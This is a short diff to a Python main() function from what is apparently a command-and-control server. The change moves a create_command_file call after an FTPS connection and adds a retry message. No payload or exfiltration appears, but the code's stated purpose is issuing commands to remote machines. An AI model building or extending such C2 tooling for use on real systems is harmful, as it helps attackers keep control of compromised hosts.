@@ -210,10 +210,11 @@ def main():
         try:
             ftps = ftps_connect() #for ipv4 connection test
             print("Connected to FTPS server! Debugging purpose, delete later!!")
+            create_command_file(ftps)
         except:
             time.sleep(20)
+            print("Connection to FTPS server failed! Trying again in 20 seconds!")
         
-        create_command_file(ftps)
 
 #------------------------END Command and Control Server Main------------------------
 
